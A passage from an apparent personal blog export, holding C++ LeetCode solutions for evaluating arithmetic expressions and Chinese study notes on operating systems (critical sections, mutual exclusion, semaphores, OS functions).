<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">evalRPN</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; tokens)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//用栈计算</span></span><br><span class="line">        <span class="comment">//1. 遇到数字push</span></span><br><span class="line">        <span class="comment">//2. 遇到操作符取出栈顶两个元素进行运算，然后push</span></span><br><span class="line">        <span class="comment">//3. 最后栈里剩下的就是结果</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; tokens.size(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span>&amp; s = tokens[i];</span><br><span class="line">            <span class="keyword">if</span> (s[<span class="number">0</span>] &gt;= <span class="string">'0'</span> &amp;&amp; s[<span class="number">0</span>] &lt;= <span class="string">'9'</span> || s.length() &gt; <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> val = atoi(s.c_str());</span><br><span class="line">                stk.push(val);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> right = stk.top();</span><br><span class="line">                stk.pop();</span><br><span class="line">                <span class="keyword">int</span> left = stk.top();</span><br><span class="line">                stk.pop();</span><br><span class="line">                <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">switch</span> (s[<span class="number">0</span>])</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'+'</span>: result = left+right; <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'-'</span>: result = left-right; <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'*'</span>: result = left*right; <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'/'</span>: result = left/right; <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                stk.push(result);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> stk.top();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">calculate</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//中缀转后缀，再用栈算后缀</span></span><br><span class="line">        <span class="comment">//1. 遇到数字就输出，遇到空格跳过</span></span><br><span class="line">        <span class="comment">//2. 遇到+-就和栈顶比，如果入栈时优先级比栈顶的栈内优先级高，那就push</span></span><br><span class="line">        <span class="comment">//  否则一路pop并输出top，直到不满足条件</span></span><br><span class="line">        <span class="comment">//3. 遇到(直接push</span></span><br><span class="line">        <span class="comment">//4. 遇到)一路pop并输出top，直到遇到第一个(</span></span><br><span class="line">        <span class="comment">//5. 扫完字符串后把栈里剩下的东西输出出来</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">enum</span> &#123;plus = <span class="number">0</span>, minus, lb, rb, begin, end&#125;;</span><br><span class="line">        <span class="keyword">int</span> osp[<span class="number">6</span>] = &#123; <span class="number">2</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> isp[<span class="number">6</span>] = &#123; <span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">stack</span>&lt;pair&lt;<span class="keyword">char</span>, <span class="keyword">int</span>&gt;&gt; opStk;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; suffix;</span><br><span class="line"></span><br><span class="line">        opStk.push(pair&lt;<span class="keyword">char</span>, <span class="keyword">int</span>&gt;(<span class="string">'#'</span>, <span class="number">0</span>));</span><br><span class="line">        s.push_back(<span class="string">'e'</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> c = s[i];</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">' '</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">int</span> j = i;</span><br><span class="line">            <span class="keyword">while</span> (s[j] &gt;= <span class="string">'0'</span> &amp;&amp; s[j] &lt;= <span class="string">'9'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (j != i)</span><br><span class="line">            &#123;</span><br><span class="line">                suffix.push_back(s.substr(i, j-i));</span><br><span class="line">                i = j - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> op_enum = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">switch</span> (c)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'+'</span>: op_enum = <span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'-'</span>: op_enum = <span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'('</span>: op_enum = <span class="number">2</span>; <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">')'</span>: op_enum = <span class="number">3</span>; <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'e'</span>: op_enum = <span class="number">5</span>; <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span> (osp[op_enum] &lt;= opStk.top().second)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">string</span> op_str = <span class="string">"a"</span>;</span><br><span class="line">                    op_str[<span class="number">0</span>] = opStk.top().first;</span><br><span class="line">                    opStk.pop();</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span> (op_str == <span class="string">"("</span> || op_str == <span class="string">"#"</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    suffix.push_back(op_str);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (c != <span class="string">')'</span> &amp;&amp; c != <span class="string">'e'</span>)</span><br><span class="line">                    opStk.push(pair&lt;<span class="keyword">char</span>, <span class="keyword">int</span>&gt;(c, isp[op_enum]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> evalRPN(suffix);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>解法2：先词法分析，找exp的dominant operator，递归求解exp1 op exp2</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">enum</span> type &#123;num, plus, minus, lb, rb&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">token</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        type t;</span><br><span class="line">        <span class="keyword">int</span> val;</span><br><span class="line">        <span class="keyword">int</span> level;</span><br><span class="line">        <span class="keyword">int</span> match;</span><br><span class="line">        token(type <span class="keyword">_t</span> = num, <span class="keyword">int</span> _val = <span class="number">0</span>): t(<span class="keyword">_t</span>), val(_val) &#123;&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">calculate</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//词法分析+递归解exp1 op exp2</span></span><br><span class="line">        <span class="comment">//1. 把s变成tokens数组</span></span><br><span class="line">        <span class="comment">//2. 对于exp(p, q)，</span></span><br><span class="line">        <span class="comment">//如果p &gt; q，错误</span></span><br><span class="line">        <span class="comment">//如果p = q，返回tokens[p].val</span></span><br><span class="line">        <span class="comment">//如果p &lt; q，如果pq是一对匹配的括号，返回exp(p+1, q-1)</span></span><br><span class="line">        <span class="comment">//由于加减法都是左结合，所以我们从q往p找第一个主加号，设其下标为k，</span></span><br><span class="line">        <span class="comment">//  返回 exp(p, k-1) op(k) exp(k+1, q)</span></span><br><span class="line">        <span class="comment">//主加号就是当前看来没被括号包着的加号，可以为每一个加号设置一个绝对包裹层数，传参时每脱掉一层括号，就把基础层数+1，然后去找第一个绝对层数-相对层数=0的加号</span></span><br><span class="line">        <span class="comment">//比如((a+b)+c)，绝对层数分别为2和1，脱掉第一层括号时，基础层数为1，发现第二个加号是主加号</span></span><br><span class="line">        <span class="comment">//绝对层数的计算可以由栈匹配括号时，遇到加号就把level设置成stack.size</span></span><br><span class="line">        <span class="comment">//匹配的括号可以由栈匹配括号时，为每个左括号记录他的右括号</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//词法分析</span></span><br><span class="line">        <span class="built_in">vector</span>&lt;token&gt; tokens;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> c = s[i];</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">' '</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">'('</span>) tokens.push_back(token(lb));</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">')'</span>) tokens.push_back(token(rb));</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">'+'</span>) tokens.push_back(token(plus));</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">'-'</span>) tokens.push_back(token(minus));</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> j = i;</span><br><span class="line">                <span class="keyword">while</span> (s[j] &gt;= <span class="string">'0'</span> &amp;&amp; s[j] &lt;= <span class="string">'9'</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    j++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">int</span> val = atoi(s.substr(i, j-i).c_str());</span><br><span class="line">                tokens.push_back(token(num, val));</span><br><span class="line">                i = j<span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//计算层数</span></span><br><span class="line">        <span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; bStk;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; tokens.size(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            type t = tokens[i].t;</span><br><span class="line">            <span class="keyword">if</span> (t == lb) bStk.push(i);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (t == rb) &#123; tokens[bStk.top()].match = i; bStk.pop(); &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (t == plus || t == minus) tokens[i].level = bStk.size();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//解exp</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">exp</span>(tokens, <span class="number">0</span>, tokens.size()<span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">exp</span><span class="params">(<span class="built_in">vector</span>&lt;token&gt;&amp; tokens, <span class="keyword">int</span> p, <span class="keyword">int</span> q, <span class="keyword">int</span> level)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (p &gt; q) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p == q) <span class="keyword">return</span> tokens[p].val;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (tokens[p].t == lb &amp;&amp; tokens[q].t == rb &amp;&amp; tokens[p].match == q) <span class="keyword">return</span> <span class="built_in">exp</span>(tokens, p+<span class="number">1</span>, q<span class="number">-1</span>, level+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> dominant_op = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = q; i &gt;= p; i--)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ((tokens[i].t == plus || tokens[i].t == minus) &amp;&amp; tokens[i].level == level)</span><br><span class="line">                &#123;</span><br><span class="line">                    dominant_op = i;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (tokens[dominant_op].t == plus)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">exp</span>(tokens, p, dominant_op<span class="number">-1</span>, level) + <span class="built_in">exp</span>(tokens, dominant_op+<span class="number">1</span>, q, level);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">exp</span>(tokens, p, dominant_op<span class="number">-1</span>, level) - <span class="built_in">exp</span>(tokens, dominant_op+<span class="number">1</span>, q, level);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title>OS2019_winter</title>
    <url>/2019/01/31/OS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>经一年半的学习，发现计科本科生课程中与计算机原理相关的课程多是隔靴搔痒，用到时再查书/百度也不迟，故接下来的课程中将关注点放在各章的开头1~2节，若有兴趣再继续深入。</p>
<p>参考书目：《操作系统教程（第5版）》费翔林</p>
<hr>
<h1 id="第一章-操作系统概论"><a href="#第一章-操作系统概论" class="headerlink" title="第一章 操作系统概论"></a>第一章 操作系统概论</h1><p><strong>PPT内容主要讲述以下问题：</strong></p>
<h2 id="1-单道-多道程序的CPU效率问题。"><a href="#1-单道-多道程序的CPU效率问题。" class="headerlink" title="1. 单道/多道程序的CPU效率问题。"></a>1. 单道/多道程序的CPU效率问题。</h2><h2 id="2-对于一个操作系统来说，它要有哪些功能？"><a href="#2-对于一个操作系统来说，它要有哪些功能？" class="headerlink" title="2. 对于一个操作系统来说，它要有哪些功能？"></a>2. 对于一个操作系统来说，它要有哪些功能？</h2><h2 id="3-从发明至今，有哪些操作系统，特点是什么？"><a href="#3-从发明至今，有哪些操作系统，特点是什么？" class="headerlink" title="3. 从发明至今，有哪些操作系统，特点是什么？"></a>3. 从发明至今，有哪些操作系统，特点是什么？</h2><hr>
<h1 id="第三章-同步、通信与死锁"><a href="#第三章-同步、通信与死锁" class="headerlink" title="第三章 同步、通信与死锁"></a>第三章 同步、通信与死锁</h1><p><strong>PPT内容主要讲述以下问题：</strong></p>
<h2 id="什么是并发进程"><a href="#什么是并发进程" class="headerlink" title="什么是并发进程"></a>什么是并发进程</h2><hr>
<h2 id="并发进程与时间无关的充分条件Bernstein条件"><a href="#并发进程与时间无关的充分条件Bernstein条件" class="headerlink" title="并发进程与时间无关的充分条件Bernstein条件"></a>并发进程与时间无关的充分条件Bernstein条件</h2><blockquote>
<p><strong>Bernstein条件</strong>：</p>
<p>设进程<strong>A</strong>引用变量集合为<strong>R1</strong>，改变变量集合为<strong>W1</strong>，进程<strong>B</strong>引用变量集合为<strong>R2</strong>，改变变量集合为<strong>W2</strong>。那么只要满足：</p>
<p>(R1 ∩ W2) ∪ (R2 ∩ W1) ∪ (W1 ∩ W2) = ∅</p>
<p>那么进程<strong>A</strong>和进程<strong>B</strong>与时间无关。</p>
<p>简而言之就是A和B的读写不冲突，也不会往同一个变量里写。</p>
</blockquote>
<hr>
<h2 id="并发进程间的交互："><a href="#并发进程间的交互：" class="headerlink" title="并发进程间的交互："></a>并发进程间的交互：</h2><ul>
<li>竞争关系/间接制约关系：对于同一资源区，进程互斥访问，一个进程在用资源区的时候，其他进程只能等着</li>
<li>协作关系/直接制约关系：进程间互发信号控制对方是沉睡还是唤醒</li>
</ul>
<hr>
<h2 id="并发进程引起的时间问题："><a href="#并发进程引起的时间问题：" class="headerlink" title="并发进程引起的时间问题："></a>并发进程引起的时间问题：</h2><ul>
<li>结果不唯一，比如订票，抢红包</li>
<li>永远等待</li>
</ul>
<hr>
<h2 id="临界区-critial-section-是什么？"><a href="#临界区-critial-section-是什么？" class="headerlink" title="临界区(critial section)是什么？"></a>临界区(critial section)是什么？</h2><blockquote>
<p>定义：共享资源所在程序段</p>
<p>调度原则：</p>
<ul>
<li>一次只能进一个</li>
<li>里面的，不能一直呆在里面</li>
<li>外面的，不能一直等在外面</li>
<li>有空让进，无空等待，择一而入，算法可行</li>
</ul>
</blockquote>
<hr>
<h2 id="临界区管理方法："><a href="#临界区管理方法：" class="headerlink" title="临界区管理方法："></a>临界区管理方法：</h2><ul>
<li><p>先检测，后置位。弊端是检测完后可能有其他进程也进入临界区。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">inside1, inside2: Boolean</span><br><span class="line">inside1 = <span class="literal">false</span>;</span><br><span class="line">inside2 = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span> process P1:</span><br><span class="line"><span class="keyword">while</span> inside2; <span class="comment">//等待P2退出临界区</span></span><br><span class="line">inside1 = <span class="literal">true</span>;</span><br><span class="line">临界区;</span><br><span class="line">inside1 = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>先置位，后检测。弊端是置位后可能inside2又被置1，可能永远等待。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> process P1:</span><br><span class="line">inside1 = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">while</span> inside2; <span class="comment">//等待P2退出临界区</span></span><br><span class="line">临界区;</span><br><span class="line">inside1 = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<h2 id="临界区管理软件方法："><a href="#临界区管理软件方法：" class="headerlink" title="临界区管理软件方法："></a>临界区管理软件方法：</h2><ol>
<li><p>Dekker算法</p>
<blockquote>
<p>基本思想：</p>
<ol>
<li>进程P1进入临界区时，将inside1置为true。</li>
<li>若P2在临界区，则P1等待。若P2不在临界区但也想进入，询问turn变量，由turn指示谁进入。若P2不在临界区且不想进入临界区，那么P1进入临界区。</li>
</ol>
<p>代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt; TODO</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
<li><p>Peterson算法</p>
<blockquote>
<p>基本思想：</p>
<ol>
<li>进程P1进入临界区时，将inside1置为true，指示器turn置为2。</li>
<li>若P2在临界区内且turn为2，则P1等待。否则P1进入临界区，然后inside1置为false。</li>
</ol>
<p>代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt; TODO</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ol>
<hr>
<h2 id="临界区管理硬件方法："><a href="#临界区管理硬件方法：" class="headerlink" title="临界区管理硬件方法："></a>临界区管理硬件方法：</h2><ol>
<li><p>关中断</p>
<p> 进入临界区前关中断，进入临界区，出临界区后开中断</p>
</li>
<li><p>用TS指令(test and set)</p>
<p> 反复TS代表临界区的lock变量，即“上锁”，如果该临界区空闲，会返回true，否则返回false。如果空闲，就进入临界区，否则一直反复。出临界区后lock置为true，即“开锁”。</p>
<blockquote>
<p>TS(x)指令等价于这段代码</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">TS</span><span class="params">(<span class="keyword">bool</span> &amp;x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x == <span class="literal">true</span>)&#123;</span><br><span class="line">        x = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ol>
<ol>
<li><p>用SWAP指令(在x86-64架构下是XCHG指令)</p>
<p> 一开始置临界区的lock变量为false，进程P的变量为key，置为true。交换一次lock和key(“上锁”)就检测一次key，如果key为false，说明临界区此时为空闲，进入临界区，出来后再次交换lock和key，即“开锁”。</p>
<p> 代码：</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span> lock = <span class="literal">false</span>;</span><br><span class="line">cobegin</span><br><span class="line">    <span class="function">process <span class="title">P</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">bool</span> key = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            SWAP(key, lock);    <span class="comment">//上锁</span></span><br><span class="line">        &#125; <span class="keyword">while</span>(key);</span><br><span class="line">        临界区;</span><br><span class="line">        SWAP(key, lock);        <span class="comment">//开锁</span></span><br><span class="line">    &#125;</span><br><span class="line">coend</span><br></pre></td></tr></table></figure>
</li>
</ol>
<hr>
<h2 id="进程同步问题"><a href="#进程同步问题" class="headerlink" title="进程同步问题"></a>进程同步问题</h2><p><del>书上没讲定义，按我的理解就是对共享资源的读写一致性问题，说白了还是前面的并发进程问题没解决呗</del>。</p>
<p>百度说，进程同步是指的进程相互协作、等待的过程。</p>
<p>同步的办法有3种，信号量与PV操作、管程、消息传递。</p>
<hr>
<h2 id="信号量与PV操作"><a href="#信号量与PV操作" class="headerlink" title="信号量与PV操作"></a>信号量与PV操作</h2><p>信号量用来表示一个物理资源的使用情况，PV操作用来控制资源使用。</p>
<p>同步原语：P(Proberen,测试)，V(Verhogen,增量)。</p>
<p>除了赋初值外，信号量只能由同步原语操作。</p>
<p>(所谓原语，就是一段在执行过程中不许中断的指令序列)</p>
<hr>
<h2 id="管程"><a href="#管程" class="headerlink" title="管程"></a>管程</h2><hr>
<h2 id="进程通信"><a href="#进程通信" class="headerlink" title="进程通信"></a>进程通信</h2><hr>
<h2 id="死锁问题"><a href="#死锁问题" class="headerlink" title="死锁问题"></a>死锁问题</h2><hr>
<h2 id="具体问题的解决方案"><a href="#具体问题的解决方案" class="headerlink" title="具体问题的解决方案"></a>具体问题的解决方案</h2><ul>
<li>生产者-消费者问题</li>
<li>五个哲学家吃通心面问题</li>
<li>读者-写者问题</li>
<li>理发师问题</li>
</ul>
<hr>
<h1 id="课程简介"><a href="#课程简介" class="headerlink" title="课程简介"></a>课程简介</h1><h2 id="成绩组成"><a href="#成绩组成" class="headerlink" title="成绩组成"></a>成绩组成</h2><p>平时作业：10%<br>实验：30%<br>期中：10%<br>期末：50%</p>
<p>实验类似PA，阶段之间有联系，硬DDL<br>期中讲完3章考</p>
<h1 id="第一章-操作系统概述"><a href="#第一章-操作系统概述" class="headerlink" title="第一章 操作系统概述"></a>第一章 操作系统概述</h1><h2 id="杂记"><a href="#杂记" class="headerlink" title="杂记"></a>杂记</h2><p>一些敏感系统不用操作系统的原因：</p>
<ol>
<li>直接汇编放内存速度快</li>
<li>防止出错？？</li>
</ol>
<p>裸机：未安装操作系统的计算机</p>
<p>操作系统的主要目标：</p>
<ol>
<li>扩大机器功能</li>
<li>管理系统资源</li>
<li>提高系统效率</li>
<li>构筑开发环境</li>
<li>方便用户使用</li>
</ol>
<p>资源管理技术：复用、虚拟、抽象</p>
<h2 id="资源复用"><a href="#资源复用" class="headerlink" title="资源复用"></a>资源复用</h2><h3 id="空分复用共享"><a href="#空分复用共享" class="headerlink" title="空分复用共享"></a>空分复用共享</h3><p>例如，将内存、磁盘，按4KB一页划分，分配给不同进程。</p>
<h3 id="时分复用共享"><a href="#时分复用共享" class="headerlink" title="时分复用共享"></a>时分复用共享</h3><p>时分独占式：<br>进程1使用一个完整周期后才释放资源。</p>
<p>时分共享式：<br>例如，将CPU使用时间分为若干个时间片，进程1使用第1、3、5片，进程2使用第2、4、6片…</p>
<h2 id="资源虚拟"><a href="#资源虚拟" class="headerlink" title="资源虚拟"></a>资源虚拟</h2><p>把物理资源变成逻辑上的多个对应物。<br>例如，计算机连接到打印机，发送打印命令时，先发到虚拟的打印机，等一个打印文件完全发到虚拟打印机后，物理打印机才开始打印。有多个文件请求打印时，进入虚拟的打印机的队列。</p>
<h2 id="资源抽象"><a href="#资源抽象" class="headerlink" title="资源抽象"></a>资源抽象</h2><p>用软件来屏蔽硬件实现细节，只要调用API就行了</p>
<p>操作系统：管理计算机硬件资源的系统软件，为用户提供交互界面，提升硬件使用效率，主要方法是复用、虚拟和抽象。<br>2019-2-26</p>
<hr>
<h2 id="认识操作系统的四种观点"><a href="#认识操作系统的四种观点" class="headerlink" title="认识操作系统的四种观点"></a>认识操作系统的四种观点</h2><h3 id="服务用户观点"><a href="#服务用户观点" class="headerlink" title="服务用户观点"></a>服务用户观点</h3><p>系统调用向API提供服务</p>
<p>操作系统提供良好的人机界面</p>
<h3 id="进程交互观点"><a href="#进程交互观点" class="headerlink" title="进程交互观点"></a>进程交互观点</h3><p>操作系统作为<strong>进程执行的控制者和执行者</strong></p>
<ul>
<li>OS需要提供机制，解决并发进程的<strong>互斥、同步、通信和死锁问题</strong></li>
</ul>
<h3 id="系统实现观点"><a href="#系统实现观点" class="headerlink" title="系统实现观点"></a>系统实现观点</h3><p>操作系统作为扩展机或虚拟机，把硬件的复杂性与用户隔离开来。</p>
<ul>
<li>把操作系统分为若干层次，逐步添加到裸机上，系统功能就能增加一点形成操作系统虚拟机</li>
<li>扩充后的虚拟机不仅能使用<strong>硬件指令</strong>，还能使用<strong>系统指令</strong></li>
</ul>
<h3 id="资源管理观点"><a href="#资源管理观点" class="headerlink" title="资源管理观点"></a>资源管理观点</h3><p>操作系统对软硬件资源进行<strong>资源复用、虚拟和抽象</strong></p>
<p>管理各种资源</p>
<h2 id="操作系统功能"><a href="#操作系统功能" class="headerlink" title="操作系统功能"></a>操作系统功能</h2><h3 id="处理器管理"><a href="#处理器管理" class="headerlink" title="处理器管理"></a>处理器管理</h3><p>多道程序设计，提高处理器效率。</p>
<h3 id="存储管理"><a href="#存储管理" class="headerlink" title="存储管理"></a>存储管理</h3><p>主要是管理内存，包括</p>
<ul>
<li>内存分配</li>
<li>地址转换</li>
<li>存储保护</li>
<li>内存共享</li>
<li>存储扩充</li>
</ul>
<h3 id="设备管理"><a href="#设备管理" class="headerlink" title="设备管理"></a>设备管理</h3><p>主要任务</p>
<ul>
<li>管理外设</li>
<li>发挥设备的并行性</li>
<li>提供设备驱动程序和中断处理程序</li>
</ul>
<p>核心功能</p>
<ul>
<li>设备中断处理</li>
<li>缓冲区管理</li>
<li>设备独立性<ul>
<li>实现逻辑设备到物理设备之间的映射</li>
</ul>
</li>
<li>设备的分配和回收</li>
<li>共享型设备的驱动调度</li>
<li>虚拟设备</li>
</ul>
<h3 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h3><p>对用户文件和系统文件进行管理</p>
<ul>
<li>文件逻辑组织方法</li>
<li>文件物理组织方法</li>
<li>文件存取和使用方法</li>
<li>文件目录管理</li>
<li>文件共享和安全性控制</li>
</ul>
<h3 id="网络与通信管理"><a href="#网络与通信管理" class="headerlink" title="网络与通信管理"></a>网络与通信管理</h3><p>通过网络协议进行管理</p>
<h2 id="操作系统主要特性"><a href="#操作系统主要特性" class="headerlink" title="操作系统主要特性"></a>操作系统主要特性</h2><h3 id="并发性"><a href="#并发性" class="headerlink" title="并发性"></a>并发性</h3><p>并发：指的是两个或两个以上的事件在同一时间间隔内（比如1分钟内）发生<br>并行：在同一时刻发生</p>
<p>要求实现多个进程间的安全切换</p>
<h3 id="共享性"><a href="#共享性" class="headerlink" title="共享性"></a>共享性</h3><p>解决读写一致问题、临界区之类的问题</p>
<h3 id="异步性"><a href="#异步性" class="headerlink" title="异步性"></a>异步性</h3><p>进程的开始、暂停、前进速度都是随机的</p>
<p>作业到达系统的类型和时间是随机的</p>
<p>操作员发命令或按按钮的时刻是随机的</p>
<p>程序出错是随机的</p>
<p>软硬件中断是随机的</p>
<p><strong>所以需要解决和时间有关的错误</strong></p>
<h2 id="多道程序设计效果"><a href="#多道程序设计效果" class="headerlink" title="多道程序设计效果"></a>多道程序设计效果</h2><ol>
<li><p>提高了系统效率</p>
</li>
<li><p>延长了每道题的计算时间</p>
</li>
<li><p>牺牲了用户的响应时间</p>
</li>
</ol>
